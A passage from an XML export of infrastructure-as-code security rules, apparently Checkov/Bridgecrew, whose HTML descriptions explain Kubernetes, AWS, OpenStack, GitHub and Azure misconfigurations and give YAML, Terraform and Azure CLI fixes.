<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Containers rely on the traditional Unix security model granting explicit and implicit permissions to resources, through permissions granted to users and groups. User namespaces are not enabled in Kubernetes. The container's user ID table maps to the host's user table, and running a process as the root user inside a container runs it as root on the host. Although possible, we do not recommend running as root inside the container.</p>
<p>Containers that run as root usually have far more permissions than their workload requires. In case of compromise, an attacker can use these permissions to further an attack on the network. Several container images use the root user to run PID 1. An attacker will have root permissions in the container and be able to exploit mis-configurations.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob</li>
<li><strong>Arguments</strong>:<br/>
runAsNonRoot (Optional) If true, Requires the container to run without root privileges. Default to false.<br/>
runAsUser (Optional) If user number is anything other than 0, requires the container to run with that user id, which is not root.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Pod</button><button type="button">CronJob</button><button type="button">Other</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Pod">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
    securityContext:
+   runAsNonRoot: true
+   runAsUser: &lt;specific user&gt;
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="CronJob">apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: &lt;name&gt;
spec:
  schedule: &lt;&gt;
  jobTemplate:
    spec:
      template:
        spec:
            securityContext:
+            runAsNonRoot: true
+                        runAsUser: &lt;specific user&gt;
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Other">apiVersion: &lt;&gt;
kind: &lt;kind&gt;
metadata:
  name: &lt;name&gt;
spec:
  template:
    spec:
        securityContext:
+           runAsNonRoot: true
+               runAsUser: &lt;specific user&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_22' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_22</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_22' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_22</key>
    <name>Ensure an IAM User does not have access to the console</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="iam-user-has-access-to-the-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-iam-user-has-access-to-the-console"></div>IAM User has access to the console</div><a aria-label="Skip link to IAM User has access to the console" class="heading-anchor-icon fa fa-anchor" href="#iam-user-has-access-to-the-console"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-an-iam-user-does-not-have-access-to-the-console-group' target='_blank'> https://docs.bridgecrew.io/docs/ensure-an-iam-user-does-not-have-access-to-the-console-group</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-an-iam-user-does-not-have-access-to-the-console-group' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_24</key>
    <name>Ensure containers with added capability are not allowed</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="containers-with-added-capability-are-allowed"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-containers-with-added-capability-are-allowed"></div>Containers with added capability are allowed</div><a aria-label="Skip link to Containers with added capability are allowed" class="heading-anchor-icon fa fa-anchor" href="#containers-with-added-capability-are-allowed"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Using the Linux capabilities feature you can grant certain privileges to a process without granting all the privileges of the root user. Added capabilities entitle containers in a pod with additional privileges that can be used to change core processes and networking settings of a cluster. We recommend you only use privileges that are required for the proper function of the cluster.</p>
<p>To add or remove Linux capabilities for a container, you can include the capabilities field in the <strong>securityContext</strong> section of the container manifest.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: PodSecurityPolicy</li>
<li><strong>Argument</strong>: allowedCapabilities (Optional)<br/>
Provides a list of capabilities that may be added to a container beyond the default set.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: &lt;policy name&gt;
spec:
- allowedCapabilities:
</code></pre></div></div>
<p>To use a <strong>PodSecurityPolicy</strong> resource, the requesting user or target pod&#8217;s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use <strong>RBAC</strong>, a standard Kubernetes authorization mode.</p>
<p>A <strong>Role</strong> or <strong>ClusterRole</strong> needs to grant access to <strong>use</strong> the desired policies. </p>
<p><strong>Kind</strong>: ClusterRole</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: &lt;role name&gt;
rules:
- apiGroups: ['policy']
  resources: ['podsecuritypolicies']
  verbs:     ['use']
  resourceNames:
  - &lt;policy name&gt;
</code></pre></div></div>
<p>The <strong>ClusterRole</strong> is then bound to the authorized service(s):</p>
<p><strong>Kind</strong>: ClusterRoleBinding</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: &lt;binding name&gt;
roleRef:
  kind: ClusterRole
  name: &lt;role name&gt;
  apiGroup: rbac.authorization.k8s.io
subjects:
- kind: ServiceAccount
  name: &lt;authorized service account name&gt;
  namespace: &lt;authorized pod namespace&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_23' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_23</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_23' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_26</key>
    <name>Do not specify hostPort unless absolutely necessary</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="hostport-is-specified"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-host-port-is-specified"></div>hostPort is specified</div><a aria-label="Skip link to hostPort is specified" class="heading-anchor-icon fa fa-anchor" href="#hostport-is-specified"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The hostPort setting applies to the Kubernetes containers. The container port will be exposed to the external network at <!-- -->:<!-- -->, where the hostIP is the IP address of the Kubernetes node where the container is running, and the hostPort is the port requested by the user.</p>
<p>We recommend that you do not specify a hostPort for a pod unless it is absolutely necessary. When you bind a pod to a hostPort, it limits the number of places the pod can be scheduled, because each &lt;hostIP, hostPort, protocol&gt; combination must be unique. </p>
<blockquote class="callout callout_warn" theme="&#128679;"><h3 class="callout-heading"><span class="callout-icon">&#128679;</span><p>Warning</p></h3><p>If you do not specify the hostIP and protocol explicitly, Kubernetes will use 0.0.0.0 as the default hostIP and TCP as the default protocol. This will expose your host to the internet.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Argument</strong>: hostPort (Optional)<br/>
Defines the number of port to expose on the host.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;Pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    ports:
-    hostPort: &lt;port&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_25' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_25</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_25' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_6</key>
    <name>Ensure S3 Bucket has public access blocks</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="s3-bucket-does-not-have-public-access-blocks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-s-3-bucket-does-not-have-public-access-blocks"></div>S3 Bucket does not have public access blocks </div><a aria-label="Skip link to S3 Bucket does not have public access blocks " class="heading-anchor-icon fa fa-anchor" href="#s3-bucket-does-not-have-public-access-blocks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When you create an S3 bucket, it is good practice to set the additional resource  <strong>aws_s3_bucket_public_access_block</strong> to ensure the bucket is never accidentally public.</p>
<p>We recommend you ensure S3 bucket has public access blocks. If the public access block is not attached it defaults to False.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_s3_bucket, aws_s3_bucket_public_access_block</li>
<li><strong>Argument:</strong> <em>bucket </em>and of <em>block_public_acls</em> aws_s3_bucket_public_access_block</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_s3_bucket" "bucket_good_1" {
  bucket = "bucket_good"
}

resource "aws_s3_bucket_public_access_block" "access_good_1" {
  bucket = aws_s3_bucket.bucket_good_1.id

  block_public_acls   = true
  block_public_policy = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/s3-bucket-should-have-public-access-blocks-defaults-to-false-if-the-public-access-block-is-not-attached' target='_blank'> https://docs.bridgecrew.io/docs/s3-bucket-should-have-public-access-blocks-defaults-to-false-if-the-public-access-block-is-not-attached</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/s3-bucket-should-have-public-access-blocks-defaults-to-false-if-the-public-access-block-is-not-attached' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_27</key>
    <name>Limit mounting Docker socket daemon in a container</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="mounting-docker-socket-daemon-in-a-container-is-not-limited"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-mounting-docker-socket-daemon-in-a-container-is-not-limited"></div>Mounting Docker socket daemon in a container is not limited</div><a aria-label="Skip link to Mounting Docker socket daemon in a container is not limited" class="heading-anchor-icon fa fa-anchor" href="#mounting-docker-socket-daemon-in-a-container-is-not-limited"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Docker runs through a non-networked UNIX socket. In daemon mode it only allows connections from clients authenticated by a certificate signed by that CA. This socket can be mounted by other containers unless correct permissions are in place. Once mounted, the socket can be used to spin up any container, create new images, or shut down existing containers.</p>
<p>To protect the docker socket daemon running in a container, set appropriate SELinux/AppArmor profiles to limit containers mounting this socket.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<p><strong>Resource</strong>: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob<br/>
<strong>Argument</strong>: volumes:hostPath (Optional)<br/>
Mounts a file or directory from the host node&#8217;s filesystem into your Pod. If the path is set to /var/lib/docker, the container has access to Docker internals.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Pod</button><button type="button">CronJob</button><button type="button">Other</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Pod">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
    volumes:
        -name: &lt;volume name&gt;
        hostPath:
-           path: /var/run/docker.sock
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="CronJob">apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: &lt;name&gt;
spec:
  schedule: &lt;&gt;
  jobTemplate:
    spec:
      template:
        spec:
          volumes:
            -name: &lt;volume name&gt;
              hostPath:
 -                      path: /var/run/docker.sock
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Other">apiVersion: &lt;&gt;
kind: &lt;kind&gt;
metadata:
  name: &lt;name&gt;
spec:
  template:
    spec:
      volumes:
        -name: &lt;volume name&gt;
          hostPath:
 -                  path: /var/run/docker.sock
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_26' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_26</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_26' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OPENSTACK_3</key>
    <name>Ensure no security groups allow ingress from 0.0.0.0:0 to port 3389 (tcp / udp)</name>
    <description>
      <![CDATA[ <br/> <a href='https://docs.bridgecrew.io/docs/bc_openstack_networking_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_openstack_networking_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_openstack_networking_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITHUB_1</key>
    <name>Ensure GitHub organization security settings require 2FA</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-organization-security-settings-does-not-include-2fa-capability"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-organization-security-settings-does-not-include-2-fa-capability"></div>GitHub organization security settings does not include 2FA capability</div><a aria-label="Skip link to GitHub organization security settings does not include 2FA capability" class="heading-anchor-icon fa fa-anchor" href="#github-organization-security-settings-does-not-include-2fa-capability"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Organization owners can require organization members, outside collaborators, and billing managers to enable two-factor authentication for their personal accounts, making it harder for malicious actors to access an organization's repositories and settings.</p>
<p>Enforce two-factor authentication:</p>
<ol>
<li>
<p>In the top right corner of GitHub.com, click your profile photo, then click Your organizations.<br/>
Your organizations in the profile menu</p>
</li>
<li>
<p>Next to the organization, click Settings.<br/>
The settings button</p>
</li>
<li>
<p>In the "Security" section of the sidebar, click  Authentication security.</p>
</li>
<li>
<p>Under "Authentication", select Require two-factor authentication for everyone in your organization, then click Save.<br/>
Require 2FA checkbox</p>
</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-github-organization-security-settings-require-2fa' target='_blank'> https://docs.bridgecrew.io/docs/ensure-github-organization-security-settings-require-2fa</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-github-organization-security-settings-require-2fa' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_12</key>
    <name>Ensure Virtual Machines are backed up using Azure backup</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="virtual-machines-are-not-backed-up-using-azure-backup"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-virtual-machines-are-not-backed-up-using-azure-backup"></div>Virtual Machines are not backed up using Azure backup</div><a aria-label="Skip link to Virtual Machines are not backed up using Azure backup" class="heading-anchor-icon fa fa-anchor" href="#virtual-machines-are-not-backed-up-using-azure-backup"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that Azure Backup service is enabled and configured to create server backups for your Microsoft Azure virtual machines (VMs), in order to follow data security best practices and compliance requirements. Azure Backup service is a cost-effective, one-click backup solution, that simplifies virtual machine data recovery in your Azure cloud account.<br/>
Once Azure Backup service is configured, your virtual machines are backed up according to a precise schedule defined within the appropriate backup policy, then recovery points are created from those backups and stored in the Azure Recovery Services vaults.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-console"></div>In Azure Console</div><a aria-label="Skip link to In Azure Console" class="heading-anchor-icon fa fa-anchor" href="#in-azure-console"></a></h2>
<ol>
<li>Sign in to Azure Management Console.</li>
<li>Navigate to All resources blade at <a href="https://portal.azure.com/#blade/HubsExtension/BrowseAll" target="_self">https://portal.azure.com/#blade/HubsExtension/BrowseAll</a> to access all your Microsoft Azure resources.</li>
<li>Choose the Azure subscription that you want to access from the Subscription filter box.</li>
<li>From the Type filter box, select Virtual machine to list only the Azure virtual machines available in the selected subscription.</li>
<li>Click on the name of the virtual machine (VM) that you want to reconfigure.</li>
<li>On the navigation panel, under Operations, select Backup to access the Azure Backup service configuration for the selected virtual machine.</li>
<li>On the Backup page, perform the following:<br/>
a. From the Recovery Service vault choose whether to create a new vault or select an existing one. An Azure Recovery Service vault is a storage entity that holds the virtual machine backups.<br/>
b.From Choose backup policy dropdown list select an existing backup policy or click Create (or edit) a new policy to create/edit a new backup policy. A backup policy specifies frequency and time at which specified resources will be backed up and how long the backup copies are retained.<br/>
c. Once the backup policy is properly configured, click Enable Backup to enable server backups for the selected Microsoft Azure virtual machine. You can now start a backup job by using Backup now button or wait for the selected policy to run the job at the scheduled time. The first backup job creates a full recovery point. Each backup job after the initial server backup creates incremental recovery points.</li>
<li>Repeat steps no. 5 &#8211; 7 to enable server backups for other Azure virtual machines available in the selected subscription.</li>
<li>Repeat steps no. 4 &#8211; 8 for each subscription created in your Microsoft Azure cloud account.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-cli"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-cli"></div>In Azure CLI</div><a aria-label="Skip link to In Azure CLI" class="heading-anchor-icon fa fa-anchor" href="#in-azure-cli"></a></h2>
<ol>
<li>Run backup vault create command (Windows/macOS/Linux) to create a new Azure Recovery Service vault that will hold all the server backups created for the specified Azure virtual machine (VM):</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">az backup vault create
    --resource-group cloud-shell-storage-westeurope
    --name cc-new-backup-vault
    --location westeurope
</code></pre></div></div>
<ol start="2">
<li>The command output should return the configuration metadata for the new vault:</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">{
  "eTag": null,
  "id": "/subscriptions/abcdabcd-1234-abcd-1234-abcdabcdabcd/resourceGroups/cloud-shell-storage-westeurope/providers/Microsoft.RecoveryServices/vaults/cc-new-backup-vault",
  "location": "westeurope",
  "name": "cc-new-backup-vault",
  "properties": {
    "provisioningState": "Succeeded",
    "upgradeDetails": null
  },
  "resourceGroup": "cloud-shell-storage-westeurope",
  "sku": {
    "name": "Standard"
  },
  "tags": null,
  "type": "Microsoft.RecoveryServices/vaults"
}
</code></pre></div></div>
<ol start="3">
<li>Run backup protection enable-for-vm command (Windows/macOS/Linux) to enable server backups for the selected Microsoft Azure virtual machine. Use the default backup policy provided by Azure Backup service or run az backup policy set command (Windows/macOS/Linux) to update the default policy if you need to change the backup schedule/frequency and/or the retention period configured. The default backup protection policy (i.e. "DefaultPolicy") runs a backup job each day and retains recovery points for 30 days:</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">az backup protection enable-for-vm
    --resource-group cloud-shell-storage-westeurope
    --vm cc-production-vm
    --vault-name cc-new-backup-vault
    --policy-name DefaultPolicy
</code></pre></div></div>
<ol start="4">
<li>The command output should return the backup protection enable-for-vm command request metadata:</li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">{
  "eTag": null,
  "id": "/subscriptions/abcdabcd-1234-abcd-1234-abcdabcdabcd/resourcegroups/cc-vm-resource-group/providers/microsoft.recoveryservices/vaults/cc-new-backup-vault/backupJobs/abcdabcd-1234-abcd-1234-abcdabcdabcd",
  "location": null,
  "name": "abcdabcd-1234-abcd-1234-abcdabcdabcd",
  "properties": {
    "actionsInfo": null,
    "activityId": "abcdabcd-1234-abcd-1234-abcdabcdabcd",
    "backupManagementType": "AzureIaasVM",
    "containerName": ";iaasvmcontainerv2;cc-vm-resource-group;cc-production-vm",
    "duration": "0:00:30.975155",
    "endTime": "2019-10-29T12:15:00.240606+00:00",
    "entityFriendlyName": "cc-production-vm",
    "errorDetails": null,
    "extendedInfo": {
      "dynamicErrorMessage": null,
      "estimatedRemainingDuration": null,
      "internalPropertyBag": null,
      "progressPercentage": null,
      "propertyBag": {
        "Policy Name": "DefaultPolicy",
        "VM Name": "cc-production-vm"
      },
      "tasksList": []
    },
    "jobType": "AzureIaaSVMJob",
    "operation": "ConfigureBackup",
    "startTime": "2019-10-29T12:15:00.265451+00:00",
    "status": "Completed",
    "virtualMachineVersion": "Compute"
  },
  "resourceGroup": "cloud-shell-storage-westeurope",
  "tags": null,
  "type": "Microsoft.RecoveryServices/vaults/backupJobs"
}
</code></pre></div></div>
<ol start="5">
<li>Repeat steps no. 1 &#8211; 4 to enable server backups for other Azure virtual machines provisioned in the current subscription.</li>
<li>Repeat steps no. 1 &#8211; 5 for each subscription available within your Microsoft Azure cloud account.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_backup_protected_vm, azurerm_virtual_machine</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_virtual_machine" "example_ok" {
